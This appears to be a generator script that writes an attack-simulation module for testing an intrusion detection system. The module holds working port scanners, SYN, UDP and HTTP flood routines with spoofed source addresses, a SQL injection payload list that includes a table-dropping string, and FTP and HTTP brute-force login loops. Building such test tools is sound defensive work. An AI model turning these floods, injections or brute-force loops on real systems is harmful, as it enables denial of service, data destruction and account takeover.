#!/usr/bin/env python3
# Simple script to create the attack_simulation.py file

import os

content = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

\"\"\"
Attack Simulation Module
This module provides functionality to simulate various network attacks for testing IDS effectiveness.
\"\"\"

import os
import sys
import logging
import time
import random
import ipaddress
import threading
import subprocess
import socket
import json
import yaml
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Union, Optional, Any
from collections import defaultdict, deque

# Try importing optional dependencies
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("scapy not available. Some attack simulations will be disabled.")

# Setup logging
logger = logging.getLogger('ids.testing')

class AttackSimulator:
    \"\"\"Base class for attack simulators.\"\"\"
    
    def __init__(self, config=None):
        \"\"\"
        Initialize the attack simulator.
        
        Args:
            config (dict, optional): Configuration dictionary
        \"\"\"
        self.config = config or {}
        self.name = self.__class__.__name__
        self.running = False
        self.threads = []
        
    def setup(self):
        \"\"\"
        Set up the attack simulation environment.
        Must be implemented by subclasses.
        
        Returns:
            bool: True if setup successful, False otherwise
        \"\"\"
        raise NotImplementedError("Subclasses must implement setup()")
        
    def run(self):
        \"\"\"
        Run the attack simulation.
        Must be implemented by subclasses.
        
        Returns:
            bool: True if simulation successful, False otherwise
        \"\"\"
        raise NotImplementedError("Subclasses must implement run()")
        
    def cleanup(self):
        \"\"\"
        Clean up after the attack simulation.
        Must be implemented by subclasses.
        
        Returns:
            bool: True if cleanup successful, False otherwise
        \"\"\"
        raise NotImplementedError("Subclasses must implement cleanup()")
        
    def start(self):
        \"\"\"
        Start the attack simulation in a separate thread.
        
        Returns:
            bool: True if simulation started, False otherwise
        \"\"\"
        if self.running:
            logger.warning(f"{self.name} is already running")
            return False
            
        if not self.setup():
            logger.error(f"Failed to set up {self.name}")
            return False
            
        logger.info(f"Starting {self.name}")
        self.running = True
        
        thread = threading.Thread(target=self._run_thread)
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        return True
        
    def _run_thread(self):
        \"\"\"Run the attack simulation in a thread.\"\"\"
        try:
            self.run()
        except Exception as e:
            logger.error(f"Error in {self.name}: {e}")
        finally:
            self.running = False
            self.cleanup()
            
    def stop(self):
        \"\"\"
        Stop the attack simulation.
        
        Returns:
            bool: True if simulation stopped, False otherwise
        \"\"\"
        if not self.running:
            logger.warning(f"{self.name} is not running")
            return False
            
        logger.info(f"Stopping {self.name}")
        self.running = False
        
        # Wait for threads to complete
        for thread in self.threads:
            thread.join(timeout=5.0)
            
        self.threads = []
        
        return self.cleanup()

class PortScanSimulator(AttackSimulator):
    \"\"\"Simulates port scanning attacks.\"\"\"
    
    def __init__(self, config=None):
        \"\"\"
        Initialize the port scan simulator.
        
        Args:
            config (dict, optional): Configuration dictionary
        \"\"\"
        super().__init__(config)
        
        # Default configuration
        self.target = self.config.get('target', '127.0.0.1')
        self.ports = self.config.get('ports', [22, 80, 443, 3306, 5432])
        self.scan_type = self.config.get('scan_type', 'tcp_connect')
        self.delay = self.config.get('delay', 0.5)  # Delay between port scans
        
    def setup(self):
        \"\"\"Set up the port scan simulation.\"\"\"
        logger.info(f"Setting up port scan simulation against {self.target}")
        
        # Validate target
        try:
            socket.gethostbyname(self.target)
        except socket.gaierror:
            logger.error(f"Invalid target: {self.target}")
            return False
            
        return True
        
    def run(self):
        \"\"\"Run the port scan simulation.\"\"\"
        logger.info(f"Running {self.scan_type} port scan against {self.target}")
        
        if self.scan_type == 'tcp_connect' or not SCAPY_AVAILABLE:
            self._run_tcp_connect_scan()
        elif self.scan_type == 'syn_scan' and SCAPY_AVAILABLE:
            self._run_syn_scan()
        elif self.scan_type == 'fin_scan' and SCAPY_AVAILABLE:
            self._run_fin_scan()
        else:
            logger.error(f"Unsupported scan type: {self.scan_type}")
            return False
            
        return True
        
    def _run_tcp_connect_scan(self):
        \"\"\"Run a TCP connect port scan.\"\"\"
        for port in self.ports:
            if not self.running:
                break
                
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            try:
                logger.debug(f"Scanning {self.target}:{port}")
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    logger.info(f"Port {port} is open")
            except Exception as e:
                logger.debug(f"Error scanning port {port}: {e}")
            finally:
                sock.close()
                
            # Delay between port scans
            time.sleep(self.delay)
            
    def _run_syn_scan(self):
        \"\"\"Run a SYN port scan using Scapy.\"\"\"
        if not SCAPY_AVAILABLE:
            logger.error("Scapy is required for SYN scan")
            return False
            
        for port in self.ports:
            if not self.running:
                break
                
            logger.debug(f"Scanning {self.target}:{port} with SYN scan")
            
            # Build the SYN packet
            ip = scapy.IP(dst=self.target)
            syn = scapy.TCP(dport=port, flags='S')
            packet = ip/syn
            
            # Send the packet and get the response
            try:
                response = scapy.sr1(packet, timeout=1, verbose=0)
                
                if response and response.haslayer(scapy.TCP):
                    if response.getlayer(scapy.TCP).flags & 0x12:  # SYN-ACK
                        logger.info(f"Port {port} is open")
                        
                        # Send RST packet to close the connection
                        rst = scapy.TCP(dport=port, flags='R')
                        scapy.send(ip/rst, verbose=0)
            except Exception as e:
                logger.debug(f"Error in SYN scan for port {port}: {e}")
                
            # Delay between port scans
            time.sleep(self.delay)
            
    def _run_fin_scan(self):
        \"\"\"Run a FIN port scan using Scapy.\"\"\"
        if not SCAPY_AVAILABLE:
            logger.error("Scapy is required for FIN scan")
            return False
            
        for port in self.ports:
            if not self.running:
                break
                
            logger.debug(f"Scanning {self.target}:{port} with FIN scan")
            
            # Build the FIN packet
            ip = scapy.IP(dst=self.target)
            fin = scapy.TCP(dport=port, flags='F')
            packet = ip/fin
            
            # Send the packet and get the response
            try:
                response = scapy.sr1(packet, timeout=1, verbose=0)
                
                if response is None:
                    # No response typically means the port is open (or filtered)
                    logger.info(f"Port {port} may be open or filtered")
                elif response.haslayer(scapy.TCP):
                    if response.getlayer(scapy.TCP).flags & 0x14:  # RST-ACK
                        logger.info(f"Port {port} is closed")
            except Exception as e:
                logger.debug(f"Error in FIN scan for port {port}: {e}")
                
            # Delay between port scans
            time.sleep(self.delay)
            
    def cleanup(self):
        \"\"\"Clean up after the port scan simulation.\"\"\"
        logger.info("Cleaning up port scan simulation")
        return True

class DDoSSimulator(AttackSimulator):
    \"\"\"Simulates DDoS attacks.\"\"\"
    
    def __init__(self, config=None):
        \"\"\"
        Initialize the DDoS simulator.
        
        Args:
            config (dict, optional): Configuration dictionary
        \"\"\"
        super().__init__(config)
        
        # Default configuration
        self.target = self.config.get('target', '127.0.0.1')
        self.target_port = self.config.get('target_port', 80)
        self.attack_type = self.config.get('attack_type', 'syn_flood')
        self.num_packets = self.config.get('num_packets', 100)
        self.packet_delay = self.config.get('packet_delay', 0.01)  # Delay between packets
        self.duration = self.config.get('duration', 30)  # Attack duration in seconds
        
        # Internal state
        self.attack_end_time = None
        
    def setup(self):
        \"\"\"Set up the DDoS simulation.\"\"\"
        logger.info(f"Setting up DDoS simulation against {self.target}:{self.target_port}")
        
        # Validate target
        try:
            socket.gethostbyname(self.target)
        except socket.gaierror:
            logger.error(f"Invalid target: {self.target}")
            return False
            
        # Set attack end time
        self.attack_end_time = time.time() + self.duration
        
        return True
        
    def run(self):
        \"\"\"Run the DDoS simulation.\"\"\"
        logger.info(f"Running {self.attack_type} attack against {self.target}:{self.target_port}")
        
        if self.attack_type == 'syn_flood' and SCAPY_AVAILABLE:
            self._run_syn_flood()
        elif self.attack_type == 'http_flood':
            self._run_http_flood()
        elif self.attack_type == 'udp_flood' and SCAPY_AVAILABLE:
            self._run_udp_flood()
        else:
            logger.error(f"Unsupported attack type: {self.attack_type}")
            return False
            
        return True
        
    def _run_syn_flood(self):
        \"\"\"Run a SYN flood attack using Scapy.\"\"\"
        if not SCAPY_AVAILABLE:
            logger.error("Scapy is required for SYN flood")
            return False
            
        packets_sent = 0
        
        while self.running and time.time() < self.attack_end_time:
            # Generate a random source IP
            src_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            
            # Build the SYN packet
            ip = scapy.IP(src=src_ip, dst=self.target)
            syn = scapy.TCP(sport=src_port, dport=self.target_port, flags='S')
            packet = ip/syn
            
            # Send the packet
            try:
                scapy.send(packet, verbose=0)
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    logger.info(f"Sent {packets_sent} SYN packets")
            except Exception as e:
                logger.debug(f"Error sending SYN packet: {e}")
                
            # Delay between packets
            time.sleep(self.packet_delay)
            
        logger.info(f"SYN flood completed, sent {packets_sent} packets")
        
    def _run_http_flood(self):
        \"\"\"Run an HTTP flood attack.\"\"\"
        packets_sent = 0
        
        while self.running and time.time() < self.attack_end_time:
            try:
                # Create a socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.target_port))
                
                # Send an HTTP request
                request = f"GET / HTTP/1.1\\r\\nHost: {self.target}\\r\\n\\r\\n"
                sock.send(request.encode())
                sock.close()
                
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    logger.info(f"Sent {packets_sent} HTTP requests")
            except Exception as e:
                logger.debug(f"Error sending HTTP request: {e}")
                
            # Delay between requests
            time.sleep(self.packet_delay)
            
        logger.info(f"HTTP flood completed, sent {packets_sent} requests")
        
    def _run_udp_flood(self):
        \"\"\"Run a UDP flood attack using Scapy.\"\"\"
        if not SCAPY_AVAILABLE:
            logger.error("Scapy is required for UDP flood")
            return False
            
        packets_sent = 0
        
        while self.running and time.time() < self.attack_end_time:
            # Generate random source IP and port
            src_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            
            # Generate random payload
            payload_size = random.randint(64, 1024)
            payload = bytes(random.getrandbits(8) for _ in range(payload_size))
            
            # Build the UDP packet
            ip = scapy.IP(src=src_ip, dst=self.target)
            udp = scapy.UDP(sport=src_port, dport=self.target_port)
            packet = ip/udp/payload
            
            # Send the packet
            try:
                scapy.send(packet, verbose=0)
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    logger.info(f"Sent {packets_sent} UDP packets")
            except Exception as e:
                logger.debug(f"Error sending UDP packet: {e}")
                
            # Delay between packets
            time.sleep(self.packet_delay)
            
        logger.info(f"UDP flood completed, sent {packets_sent} packets")
        
    def cleanup(self):
        \"\"\"Clean up after the DDoS simulation.\"\"\"
        logger.info("Cleaning up DDoS simulation")
        return True

class SQLInjectionSimulator(AttackSimulator):
    \"\"\"Simulates SQL injection attacks.\"\"\"
    
    def __init__(self, config=None):
        \"\"\"
        Initialize the SQL injection simulator.
        
        Args:
            config (dict, optional): Configuration dictionary
        \"\"\"
        super().__init__(config)
        
        # Default configuration
        self.target = self.config.get('target', 'http://127.0.0.1')
        self.target_path = self.config.get('target_path', '/login')
        self.param_name = self.config.get('param_name', 'username')
        self.num_attempts = self.config.get('num_attempts', 10)
        self.delay = self.config.get('delay', 1.0)  # Delay between attempts
        
        # SQL injection payloads
        self.payloads = self.config.get('payloads', [
            "' OR '1'='1",
            "admin' --",
            "admin' OR '1'='1' --",
            "' OR '1'='1' --",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT username,password,3 FROM users --",
            "'; DROP TABLE users; --",
            "admin' OR 1=1 #",
            "' OR ''='",
            "' OR 1=1 --"
        ])
        
    def setup(self):
        \"\"\"Set up the SQL injection simulation.\"\"\"
        logger.info(f"Setting up SQL injection simulation against {self.target}{self.target_path}")
        return True
        
    def run(self):
        \"\"\"Run the SQL injection simulation.\"\"\"
        logger.info(f"Running SQL injection attacks against {self.target}{self.target_path}")
        
        for i, payload in enumerate(self.payloads[:self.num_attempts]):
            if not self.running:
                break
                
            logger.info(f"Trying SQL injection payload ({i+1}/{self.num_attempts}): {payload}")
            
            # Build the URL with the injection payload
            if '?' in self.target_path:
                url = f"{self.target}{self.target_path}&{self.param_name}={payload}"
            else:
                url = f"{self.target}{self.target_path}?{self.param_name}={payload}"
                
            try:
                # Use sockets to make a basic HTTP request
                host = self.target.replace('http://', '').replace('https://', '')
                if '/' in host:
                    host = host.split('/')[0]
                    
                # Create a socket connection
                port = 443 if 'https://' in self.target else 80
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                # Send the HTTP request
                request = f"GET {url} HTTP/1.1\\r\\nHost: {host}\\r\\n\\r\\n"
                sock.send(request.encode())
                
                # Receive the response
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                sock.close()
                
                # Check the response for interesting content
                if 'error' in response.lower() or 'sql' in response.lower():
                    logger.info(f"Possible SQL injection vulnerability found with payload: {payload}")
                    
            except Exception as e:
                logger.debug(f"Error in SQL injection attempt: {e}")
                
            # Delay between attempts
            time.sleep(self.delay)
            
    def cleanup(self):
        \"\"\"Clean up after the SQL injection simulation.\"\"\"
        logger.info("Cleaning up SQL injection simulation")
        return True

class BruteForceSimulator(AttackSimulator):
    \"\"\"Simulates brute force login attacks.\"\"\"
    
    def __init__(self, config=None):
        \"\"\"
        Initialize the brute force simulator.
        
        Args:
            config (dict, optional): Configuration dictionary
        \"\"\"
        super().__init__(config)
        
        # Default configuration
        self.target = self.config.get('target', '127.0.0.1')
        self.target_port = self.config.get('target_port', 22)
        self.username = self.config.get('username', 'admin')
        self.protocol = self.config.get('protocol', 'ssh')
        self.num_attempts = self.config.get('num_attempts', 20)
        self.delay = self.config.get('delay', 1.0)  # Delay between attempts
        
        # Password list
        self.passwords = self.config.get('passwords', [
            'password', 'admin', '123456', 'qwerty', 'letmein',
            'welcome', 'monkey', 'password123', 'abc123', 'admin123',
            '12345678', '1234', 'login', 'passw0rd', 'master',
            'hello', 'adminadmin', 'test', 'user', 'default'
        ])
        
    def setup(self):
        \"\"\"Set up the brute force simulation.\"\"\"
        logger.info(f"Setting up brute force simulation against {self.target}:{self.target_port} ({self.protocol})")
        
        # Validate target
        try:
            socket.gethostbyname(self.target)
        except socket.gaierror:
            logger.error(f"Invalid target: {self.target}")
            return False
            
        return True
        
    def run(self):
        \"\"\"Run the brute force simulation.\"\"\"
        logger.info(f"Running brute force attack against {self.target}:{self.target_port} ({self.protocol})")
        
        if self.protocol == 'ssh':
            self._run_ssh_brute_force()
        elif self.protocol == 'ftp':
            self._run_ftp_brute_force()
        elif self.protocol == 'http':
            self._run_http_brute_force()
        else:
            logger.error(f"Unsupported protocol: {self.protocol}")
            return False
            
        return True
        
    def _run_ssh_brute_force(self):
        \"\"\"Run an SSH brute force attack.\"\"\"
        for i, password in enumerate(self.passwords[:self.num_attempts]):
            if not self.running:
                break
                
            logger.info(f"Trying SSH login ({i+1}/{self.num_attempts}): {self.username}/{password}")
            
            try:
                # Create a socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.target_port))
                
                # Just establish and close the connection to simulate the attempt
                sock.close()
                
                # In a real scenario, we would use a library like paramiko to attempt the SSH login
                
            except Exception as e:
                logger.debug(f"Error in SSH brute force attempt: {e}")
                
            # Delay between attempts
            time.sleep(self.delay)
            
    def _run_ftp_brute_force(self):
        \"\"\"Run an FTP brute force attack.\"\"\"
        for i, password in enumerate(self.passwords[:self.num_attempts]):
            if not self.running:
                break
                
            logger.info(f"Trying FTP login ({i+1}/{self.num_attempts}): {self.username}/{password}")
            
            try:
                # Create a socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.target_port))
                
                # Receive the welcome message
                sock.recv(1024)
                
                # Send USER command
                sock.send(f"USER {self.username}\\r\\n".encode())
                sock.recv(1024)
                
                # Send PASS command
                sock.send(f"PASS {password}\\r\\n".encode())
                response = sock.recv(1024).decode()
                
                # Check if login was successful
                if "230" in response:
                    logger.info(f"FTP login successful with {self.username}/{password}")
                    
                # Logout and close the connection
                sock.send(b"QUIT\\r\\n")
                sock.close()
                
            except Exception as e:
                logger.debug(f"Error in FTP brute force attempt: {e}")
                
            # Delay between attempts
            time.sleep(self.delay)
            
    def _run_http_brute_force(self):
        \"\"\"Run an HTTP basic auth brute force attack.\"\"\"
        for i, password in enumerate(self.passwords[:self.num_attempts]):
            if not self.running:
                break
                
            logger.info(f"Trying HTTP login ({i+1}/{self.num_attempts}): {self.username}/{password}")
            
            try:
                # Create a socket connection
                host = self.target
                if '://' in host:
                    host = host.split('://')[1]
                if '/' in host:
                    host = host.split('/')[0]
                    
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, self.target_port))
                
                # Create the Authorization header
                import base64
                auth = base64.b64encode(f"{self.username}:{password}".encode()).decode()
                
                # Send the HTTP request
                request = f"GET / HTTP/1.1\\r\\nHost: {host}\\r\\nAuthorization: Basic {auth}\\r\\n\\r\\n"
                sock.send(request.encode())
                
                # Receive the response
                response = sock.recv(1024).decode()
                sock.close()
                
                # Check if login was successful
                if "200 OK" in response and "401 Unauthorized" not in response:
                    logger.info(f"HTTP login successful with {self.username}/{password}")
                    
            except Exception as e:
                logger.debug(f"Error in HTTP brute force attempt: {e}")
                
            # Delay between attempts
            time.sleep(self.delay)
            
    def cleanup(self):
        \"\"\"Clean up after the brute force simulation.\"\"\"
        logger.info("Cleaning up brute force simulation")
        return True

def create_attack_simulator(attack_type, config=None):
    \"\"\"
    Create and initialize an attack simulator.
    
    Args:
        attack_type (str): Type of attack to simulate
        config (dict, optional): Configuration dictionary
        
    Returns:
        AttackSimulator: Initialized attack simulator
    \"\"\"
    if attack_type == 'port_scan':
        return PortScanSimulator(config)
    elif attack_type == 'ddos':
        return DDoSSimulator(config)
    elif attack_type == 'sql_injection':
        return SQLInjectionSimulator(config)
    elif attack_type == 'brute_force':
        return BruteForceSimulator(config)
    else:
        raise ValueError(f"Unknown attack type: {attack_type}")

def run_attack_scenario(scenario_config):
    \"\"\"
    Run a complete attack scenario with multiple attacks.
    
    Args:
        scenario_config (dict): Scenario configuration
        
    Returns:
        bool: True if scenario completed successfully, False otherwise
    \"\"\"
    scenario_name = scenario_config.get('name', 'Unknown Scenario')
    attacks = scenario_config.get('attacks', [])
    
    logger.info(f"Starting attack scenario: {scenario_name}")
    
    simulators = []
    
    try:
        # Create all simulators
        for attack_config in attacks:
            attack_type = attack_config.get('type')
            simulator = create_attack_simulator(attack_type, attack_config)
            simulators.append(simulator)
            
        # Start all simulators
        for simulator in simulators:
            simulator.start()
            
        # Wait for all simulators to complete
        while any(simulator.running for simulator in simulators):
            time.sleep(1)
            
        logger.info(f"Attack scenario completed: {scenario_name}")
        return True
        
    except Exception as e:
        logger.error(f"Error in attack scenario: {e}")
        
        # Stop all running simulators
        for simulator in simulators:
            if simulator.running:
                simulator.stop()
                
        return False

def load_scenario_from_file(filepath):
    \"\"\"
    Load an attack scenario configuration from a file.
    
    Args:
        filepath (str): Path to the scenario file (YAML or JSON)
        
    Returns:
        dict: Scenario configuration
    \"\"\"
    try:
        with open(filepath, 'r') as f:
            ext = os.path.splitext(filepath)[1].lower()
            
            if ext in ('.yaml', '.yml'):
                config = yaml.safe_load(f)
            elif ext == '.json':
                config = json.load(f)
            else:
                raise ValueError(f"Unsupported file format: {ext}")
                
        return config
        
    except Exception as e:
        logger.error(f"Error loading scenario file: {e}")
        return None

def demo():
    \"\"\"Run a demo of the attack simulation module.\"\"\"
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    logger.info("Starting attack simulation demo")
    
    # Create a port scan simulator
    port_scan_config = {
        'target': '127.0.0.1',
        'ports': [22, 80, 443, 3306, 5432],
        'scan_type': 'tcp_connect',
        'delay': 0.2
    }
    port_scanner = PortScanSimulator(port_scan_config)
    
    # Run the port scan
    logger.info("Starting port scan simulation")
    port_scanner.start()
    
    # Wait for the port scan to complete
    time.sleep(5)
    port_scanner.stop()
    
    # Create a brute force simulator
    brute_force_config = {
        'target': '127.0.0.1',
        'target_port': 22,
        'username': 'admin',
        'protocol': 'ssh',
        'num_attempts': 5,
        'delay': 0.5
    }
    brute_forcer = BruteForceSimulator(brute_force_config)
    
    # Run the brute force attack
    logger.info("Starting brute force simulation")
    brute_forcer.start()
    
    # Wait for the brute force to complete
    time.sleep(10)
    brute_forcer.stop()
    
    logger.info("Attack simulation demo completed")

if __name__ == "__main__":
    # Run the demo
    demo()
"""

# Create the directory if it doesn't exist
os.makedirs("src/testing", exist_ok=True)

# Write the content to the file
with open("src/testing/attack_simulation.py", "w") as f:
    f.write(content)

print("Successfully created src/testing/attack_simulation.py") 